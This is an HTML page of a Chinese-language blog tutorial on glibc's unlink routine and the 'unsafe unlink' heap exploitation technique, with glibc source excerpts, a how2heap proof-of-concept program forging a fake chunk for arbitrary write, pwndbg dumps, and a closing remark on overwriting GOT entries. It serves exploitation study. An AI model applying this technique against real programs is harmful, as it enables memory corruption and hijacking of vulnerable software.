@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>unsafe-unlink - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+经典漏洞
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="unsafe-unlink" />
+<meta property="og:description" content="
+经典漏洞
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/unsafe-unlink/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-13T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-13T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="unsafe-unlink"/>
+<meta name="twitter:description" content="
+经典漏洞
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">unsafe-unlink</h1>
+			<div class="meta">Posted on Sep 13, 2023</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>经典漏洞</p>
+</blockquote>
+<h2 id="glibc-unlink">Glibc unlink</h2>
+<p>当一个 free chunk 从双向链表的 bins 中取出时（堆的合并），这个过程就是 unlink。</p>
+<p>堆的合并主要看这一段代码，存在两种合并方式</p>
+<ul>
+<li>int_free 参数：p是正在free的chunk，av 指 arena(struct malloc_state)，lock避免条件竞争</li>
+<li>向后合并：prev_inuse位为0，会发生unsorted bin之间合并，会检查prev_size 和 想要合并的 bin 的 size 是否相同。unlink prev_chunk</li>
+<li>向前合并：不是top_chunk, unlink nextchunk。</li>
+<li>至于方向：在没有翻译错误的情况下，有点绕，但是可以强行解释，因为堆往高地址生长，向前就是向高地址合并，向后就是向低地址合并？</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define inuse_bit_at_offset(p, s)					      \
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define prev_size(p) ((p)-&gt;mchunk_prev_size)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">/* consolidate backward */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>prev_inuse(p)) {
+</span></span><span style="display:flex;"><span>  prevsize <span style="color:#ff79c6">=</span> prev_size(p);
+</span></span><span style="display:flex;"><span>  size <span style="color:#ff79c6">+=</span> prevsize;
+</span></span><span style="display:flex;"><span>  p <span style="color:#ff79c6">=</span> chunk_at_offset(p, <span style="color:#ff79c6">-</span>((<span style="color:#8be9fd">long</span>)prevsize));         <span style="color:#6272a4">// p = p-prevsize,就是前面的 chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> (__glibc_unlikely(chunksize(p) <span style="color:#ff79c6">!=</span> prevsize))
+</span></span><span style="display:flex;"><span>    malloc_printerr(<span style="color:#f1fa8c">&#34;corrupted size vs. prev_size while consolidating&#34;</span>);
+</span></span><span style="display:flex;"><span>  unlink_chunk(av, p);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// nextchunk = chunk_at_offset(p, size);  就是根据size进行加法，是一个宏，就是当前chunk的下一个chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// nextsize = chunksize(nextchunk); 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">if</span> (nextchunk <span style="color:#ff79c6">!=</span> av<span style="color:#ff79c6">-&gt;</span>top) {
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* get and clear inuse bit */</span>
+</span></span><span style="display:flex;"><span>  nextinuse <span style="color:#ff79c6">=</span> inuse_bit_at_offset(nextchunk, nextsize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">/* consolidate forward */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>nextinuse) {
+</span></span><span style="display:flex;"><span>  unlink_chunk(av, nextchunk);    <span style="color:#6272a4">// 当前的 arena 和 next_chunk 使用指针连接
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  size <span style="color:#ff79c6">+=</span> nextsize;
+</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">clear_inuse_bit_at_offset</span>(nextchunk, <span style="color:#bd93f9">0</span>);
+</span></span></code></pre></div><p>unlink函数主要是指针的处理，假设3个chunk，a-b-c，a-b在unsortedbin 范围，c主要防止top_chunk合并，正常情况下</p>
+<ul>
+<li>首先，unsorted bin 按照free时间顺序连接，fd指向时间靠前的chunk。</li>
+<li>向前合并：free b, free a。先成为 arena&lt;-&gt;b 双链表，然后在调用 unlink(av, b)。</li>
+<li>向后合并：free a, free b。先成为 arena&lt;-&gt;a 双链表 在int_free 调用的是 unlink(av, a)。</li>
+<li>这里就使用向后合并举例：fd=a-&gt;fd=arena, bk=a-&gt;bk=arena；在经历一个赋值语句变为 arena-&gt;bk=arena，areba-&gt;fd=arena。从arena&lt;-&gt;a 变成了 arena 完成unlink此操作。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">unlink_chunk</span>(mstate av, mchunkptr p) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (chunksize(p) <span style="color:#ff79c6">!=</span> prev_size(next_chunk(p)))
+</span></span><span style="display:flex;"><span>    malloc_printerr(<span style="color:#f1fa8c">&#34;corrupted size vs. prev_size&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  mchunkptr fd <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">-&gt;</span>fd;
+</span></span><span style="display:flex;"><span>  mchunkptr bk <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">-&gt;</span>bk;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (__builtin_expect(fd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">!=</span> p <span style="color:#ff79c6">||</span> bk<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">!=</span> p, <span style="color:#bd93f9">0</span>))
+</span></span><span style="display:flex;"><span>    malloc_printerr(<span style="color:#f1fa8c">&#34;corrupted double-linked list&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">=</span> bk;
+</span></span><span style="display:flex;"><span>  bk<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">=</span> fd;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>in_smallbin_range(chunksize_nomask(p)) <span style="color:#ff79c6">&amp;&amp;</span> p<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (p<span style="color:#ff79c6">-&gt;</span>fd_nextsize<span style="color:#ff79c6">-&gt;</span>bk_nextsize <span style="color:#ff79c6">!=</span> p <span style="color:#ff79c6">||</span> p<span style="color:#ff79c6">-&gt;</span>bk_nextsize<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">!=</span> p)
+</span></span><span style="display:flex;"><span>      malloc_printerr(<span style="color:#f1fa8c">&#34;corrupted double-linked list (not small)&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fd<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (p<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">==</span> p)
+</span></span><span style="display:flex;"><span>        fd<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">=</span> fd<span style="color:#ff79c6">-&gt;</span>bk_nextsize <span style="color:#ff79c6">=</span> fd;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>        fd<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">-&gt;</span>fd_nextsize;
+</span></span><span style="display:flex;"><span>        fd<span style="color:#ff79c6">-&gt;</span>bk_nextsize <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">-&gt;</span>bk_nextsize;
+</span></span><span style="display:flex;"><span>        p<span style="color:#ff79c6">-&gt;</span>fd_nextsize<span style="color:#ff79c6">-&gt;</span>bk_nextsize <span style="color:#ff79c6">=</span> fd;
+</span></span><span style="display:flex;"><span>        p<span style="color:#ff79c6">-&gt;</span>bk_nextsize<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">=</span> fd;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>      p<span style="color:#ff79c6">-&gt;</span>fd_nextsize<span style="color:#ff79c6">-&gt;</span>bk_nextsize <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">-&gt;</span>bk_nextsize;
+</span></span><span style="display:flex;"><span>      p<span style="color:#ff79c6">-&gt;</span>bk_nextsize<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">-&gt;</span>fd_nextsize;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后后续继续进入free函数里操作</p>
+<ul>
+<li>后续操作：此时p指向a，找到arena的bins数组，然后链入arena，设置head和foot</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* Set size/use field */</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 设置size罢了
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define set_head(p, s)       ((p)-&gt;mchunk_size = (s))
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">/* Set size at footer (only when chunk is not in use) */</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 设置下一个chunk的prev_size
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span>bck <span style="color:#ff79c6">=</span> unsorted_chunks(av);
+</span></span><span style="display:flex;"><span>fwd <span style="color:#ff79c6">=</span> bck<span style="color:#ff79c6">-&gt;</span>fd;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (__glibc_unlikely(fwd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">!=</span> bck))
+</span></span><span style="display:flex;"><span>  malloc_printerr(<span style="color:#f1fa8c">&#34;free(): corrupted unsorted chunks&#34;</span>);
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">=</span> fwd;
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">=</span> bck;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>in_smallbin_range(size)) {
+</span></span><span style="display:flex;"><span>  p<span style="color:#ff79c6">-&gt;</span>fd_nextsize <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+</span></span><span style="display:flex;"><span>  p<span style="color:#ff79c6">-&gt;</span>bk_nextsize <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>bck<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">=</span> p;
+</span></span><span style="display:flex;"><span>fwd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">=</span> p;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_head(p, size <span style="color:#ff79c6">|</span> PREV_INUSE);
+</span></span><span style="display:flex;"><span>set_foot(p, size);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>check_free_chunk(av, p);
+</span></span></code></pre></div><p>最后：arena的bins数组存放数据：</p>
+<ul>
+<li>这样涉及就好像有fd，bk指针。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>bins[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> bins[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>bins <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>
+</span></span></code></pre></div><h2 id="attack">Attack</h2>
+<p>相关的攻击手段。</p>
+<h3 id="uaf">uaf</h3>
+<p>早期发现此漏洞时，没有 <code>fd-&gt;bk != p || bk-&gt;fd != p</code> 这个条件，因此直接修改 fd, bk 来进行任意地址写</p>
+<ul>
+<li>任意地址写，如果开了 got 表保护，可以写 hook。</li>
+</ul>
+<h3 id="unsafe-unlink">unsafe unlink</h3>
+<p>在没有 PIE 和 got表可以写时，可以通过修改got表。其本质是一个heap overflow这是比较简单的。</p>
+<ul>
+<li>主要是利用 unlink 中的代码，其中指针赋值简化为 <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li>
+<li>我们控制这个 p 的内容。</li>
+</ul>
+<ol>
+<li>按照时间 malloc A,B</li>
+<li>A 堆溢出，修改A的内容 修改B的header</li>
+</ol>
+<ul>
+<li>target = &amp;p，需要我们可以写。或者 target就是p</li>
+<li>我们在 A 里伪造一个 fake free chunk: prev_inuse, size, <em>fd=&amp;target-0x18, bk=&amp;target=0x10</em></li>
+<li>利用堆溢出修改 B 的header，让fake free chunk 和 B 可以合并。</li>
+</ul>
+<ol start="3">
+<li>free B 就会 unlink，<strong>p 就是 fake free chunk</strong>，触发unlink。</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>+---------+                     +----------+ 
+</span></span><span style="display:flex;"><span>|         |                     |          |
+</span></span><span style="display:flex;"><span>|    A    |                     +----------+                    
+</span></span><span style="display:flex;"><span>|         |                     |          |  A中伪造 =&gt; fake heap head(sz, fd, bk) + data 
+</span></span><span style="display:flex;"><span>|         |                     |fake heap |
+</span></span><span style="display:flex;"><span>|         |                     |          |
+</span></span><span style="display:flex;"><span>+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink
+</span></span><span style="display:flex;"><span>|         |                     |ps     sz |
+</span></span><span style="display:flex;"><span>|         |                     |          |  B head =&gt; prev size 过检查
+</span></span><span style="display:flex;"><span>|   B     |                     |          |            prev_inuse 为0
+</span></span><span style="display:flex;"><span>|         |                     |          |
+</span></span><span style="display:flex;"><span>+---------+                     +----------+
+</span></span></code></pre></div><p>how2heap 案例</p>
+<ul>
+<li>编译时指定no-pie</li>
+<li>测试在ubuntu 22.04，可以通过assert.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;assert.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>chunk0_ptr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>  setbuf(stdout, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> malloc_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x420</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> header_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  chunk0_ptr <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)malloc(malloc_size);            <span style="color:#6272a4">// chunk0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>chunk1_ptr <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)malloc(malloc_size);  <span style="color:#6272a4">// chunk1
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  printf(<span style="color:#f1fa8c">&#34;The global chunk0_ptr is at %p, pointing to %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#ff79c6">&amp;</span>chunk0_ptr,
+</span></span><span style="display:flex;"><span>         chunk0_ptr);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;The victim chunk we are going to corrupt is at %p</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>, chunk1_ptr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// fake_head
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  chunk0_ptr[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> chunk0_ptr[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// fake fd &amp;&amp; fake bk
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  chunk0_ptr[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span>)<span style="color:#ff79c6">&amp;</span>chunk0_ptr <span style="color:#ff79c6">-</span> (<span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">uint64_t</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span>);
+</span></span><span style="display:flex;"><span>  chunk0_ptr[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span>)<span style="color:#ff79c6">&amp;</span>chunk0_ptr <span style="color:#ff79c6">-</span> (<span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">uint64_t</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span>);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Fake chunk fd: %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)chunk0_ptr[<span style="color:#bd93f9">2</span>]);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Fake chunk bk: %p</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>, (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)chunk0_ptr[<span style="color:#bd93f9">3</span>]);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// chunk1 的 header 指针
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>chunk1_hdr <span style="color:#ff79c6">=</span> chunk1_ptr <span style="color:#ff79c6">-</span> header_size;
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// chunk1 -&gt; prev_size
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  chunk1_hdr[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> malloc_size;   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been &#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;0x430, however this is its new value: %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,
+</span></span><span style="display:flex;"><span>      (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)chunk1_hdr[<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// prev_inuse 为 0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  chunk1_hdr[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">&amp;=</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// unlink 发生
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// 修改chunk0_ptr 可以修改 *(chunk0_ptr - 0x18 )的值
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  free(chunk1_ptr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> victim_string[<span style="color:#bd93f9">8</span>];
+</span></span><span style="display:flex;"><span>  strcpy(victim_string, <span style="color:#f1fa8c">&#34;Hello!~&#34;</span>);
+</span></span><span style="display:flex;"><span>  chunk0_ptr[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span>)victim_string;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Original value: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, victim_string);
+</span></span><span style="display:flex;"><span>  chunk0_ptr[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4141414142424242LL</span>;
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;New Value: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, victim_string);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// sanity check
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  assert(<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)victim_string <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x4141414142424242L</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>比较绕，但是可以直接看最后的结果，<code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>。target 的内容存放着 <code>&amp;target-0x10</code> target的地址减去0x18</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># chunk0_ptr 堆地址</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/8xg 0x405290  
+</span></span><span style="display:flex;"><span>0x405290:       0x0000000000000000      0x0000000000000431
+</span></span><span style="display:flex;"><span>0x4052a0:       0x0000000000000000      0x0000000000020d61
+</span></span><span style="display:flex;"><span>0x4052b0:       0x0000000000404050      0x0000000000404058    <span style="color:#6272a4"># fake_fd fake_bk</span>
+</span></span><span style="display:flex;"><span>0x4052c0:       0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># &amp;chunk0_ptr</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/8xg 0x0000000000404058+0x10   
+</span></span><span style="display:flex;"><span>0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404078:       0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404088:       0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404098:       0x0000000000000000      0x0000000000000000
+</span></span></code></pre></div><p>结论：target 指针指向 &amp;target-0x18。我见过的问题一般利用在全局指针数组中，通过这种方式修改got表内容。
+改<code>arr[0]</code>，这样就可以修改和读取 <code>arr[0]</code> 。改成got表，读取内容，泄露地址，又可以修改就直接修改got表内容。
